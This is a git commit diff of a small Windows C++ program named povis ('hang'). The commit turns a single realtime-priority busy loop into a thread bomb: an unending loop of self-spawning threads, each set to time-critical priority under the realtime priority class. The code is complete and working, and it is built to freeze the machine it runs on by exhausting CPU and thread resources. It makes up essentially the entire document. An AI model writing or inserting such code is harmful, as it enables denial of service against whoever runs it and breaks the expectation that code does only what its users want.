56895beffe0557bea91c4f59891f0387fa193e32
Dyachenko Yuri Igorevich (yurial) <pub.yurial@gmail.com>
2010-08-18 13:59:52 +0600

    povis v1.2 (c) 2006

--- povis.cpp
+++ povis.cpp
@@ -1,9 +1,14 @@
 #include <windows.h>
 
+unsigned long __stdcall Povis(void*)
+{
+while (TRUE) SetThreadPriority(CreateThread(0,0,Povis,0,0,0),THREAD_PRIORITY_TIME_CRITICAL);
+return 0;
+}
+
 void main()
 {
-__int64 a=0;
-SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_TIME_CRITICAL);
 SetPriorityClass(GetCurrentProcess(),REALTIME_PRIORITY_CLASS);
-while (TRUE) a++;
+SetThreadPriority(GetCurrentThread(),THREAD_PRIORITY_TIME_CRITICAL);
+while (TRUE) SetThreadPriority(CreateThread(0,0,Povis,0,0,0),THREAD_PRIORITY_TIME_CRITICAL);;
 }
